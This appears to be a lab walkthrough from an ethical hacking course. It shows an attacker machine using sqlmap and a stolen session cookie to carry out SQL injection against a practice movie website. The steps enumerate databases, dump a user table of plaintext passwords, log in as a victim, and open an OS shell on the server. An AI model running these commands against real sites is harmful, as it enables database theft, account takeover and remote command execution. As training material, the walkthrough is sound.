

1.  switch to the **Parrot** machine. Login using **attacker**/**toor**.
    
2. Click the **Mozilla Firefox** icon from the menu bar in the top-left corner of **Desktop** to launch the web browser.
    
3. Navigate to **http://www.moviescope.com/**. A **Login** page loads; enter the **Username** and **Password** as **sam** and **test**, respectively. Click the **Login** button.
    
4. Once you are logged into the website, click the **View Profile** tab on the menu bar and, when the page has loaded, make a note of the URL in the address bar of the browser.
    
5. Right-click anywhere on the webpage and click **Inspect (Q)** from the context menu, as shown in the screenshot.
    
6. The **Developer Tools** frame appears in the lower section of the browser window. Click the **Console** tab, type **document.cookie** in the lower-left corner of the browser, and press **Enter**.
    
7. Select the cookie value, then right-click and copy it, as shown in the screenshot. Minimize the web browser. Note down the URL of the web page.
    
8. Open a **Terminal** window and execute **sudo su** to run the programs as a root user (When prompted, enter the password **toor**).
    
9. Run **sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step#7]" --dbs** command.
    
10. The above query causes sqlmap to enforce various injection techniques on the name parameter of the URL in an attempt to extract the database information of the **MovieScope** website.
    
11. If the message **Do you want to skip test payloads specific for other DBMSes? [Y/n]** appears, type **Y** and press **Enter**.
    
12. If the message **for the remaining tests, do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1) values? [Y/n]** appears, type **Y** and press **Enter**.
    
13. Similarly, if any other message appears, type **Y** and press **Enter** to continue.
    
14. sqlmap retrieves the databases present in the MSSQL server. It also displays information about the web server OS, web application technology, and the backend DBMS, as shown in the screenshot.
    
15. Now, you need to choose a database and use sqlmap to retrieve the tables in the database. In this lab, we are going to determine the tables associated with the database **moviescope**.
    
16. Run **sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope --tables** command.
    
17. The above query causes sqlmap to scan the **moviescope** database for tables located in the database.
    
18. sqlmap retrieves the table contents of the moviescope database and displays them, as shown in screenshot.
    
19. Now, you need to retrieve the table content of the column **User_Login**.
    
20. Run **sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope -T User_Login --dump** command to dump all the **User_Login** table content.
    
21. sqlmap retrieves the complete **User_Login** table data from the database moviescope, containing all users' usernames under the **Uname** column and passwords under the **password** column, as shown in screenshot.
    
22. You will see that under the **password** column, the passwords are shown in plain text form.
    
23. To verify if the login details are valid, you should try to log in with the extracted login details of any of the users. To do so, switch back to the web browser, close the **Developer Tools** console, and click **Logout** to start a new session on the site.
    
24. The **Login** page appears; log in into the website using the retrieved credentials **john/qwerty**.
    
25. You will observe that you have successfully logged into the MovieScope website with john's account, as shown in the screenshot.
    
26. Now, switch back to the **Parrot Terminal window**. Run **sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" --os-shell**.
    
27. If the message **do you want sqlmap to try to optimize value(s) for DBMS delay responses** appears, type **Y** and press **Enter** to continue.
    
28. Once sqlmap acquires the permission to optimize the machine, it will provide you with the OS shell. Type **hostname** and press **Enter** to find the machine name where the site is running.
    
29. If the message **do you want to retrieve the command standard output?** appears, type **Y** and press **Enter**.
    
30. sqlmap will retrieve the hostname of the machine on which the target web application is running, as shown in the screenshot.
    
31. Type **TASKLIST** and press **Enter** to view a list of tasks that are currently running on the target system.
    
32. If the message **do you want to retrieve the command standard output?** appears, type **Y** and press **Enter**.
    
33. The above command retrieves the tasks and displays them under the **command standard output** section, as shown in the screenshots below.
    
34. Following the same process, you can use various other commands to obtain further detailed information about the target machine.
    
35. To view the available commands under the OS shell, type **help** and press **Enter**.
    
36. This concludes the demonstration of how to launch a SQL injection attack against MSSQL to extract databases using sqlmap.
    
37. Close all open windows and document all the acquired information.
    
Use other SQL injection tools such as **Mole** (https://sourceforge.net), **jSQL Injection** (https://github.com), **NoSQLMap** (https://github.com), **Havij** (https://github.com) and **blind_sql_bitshifting** (https://github.com).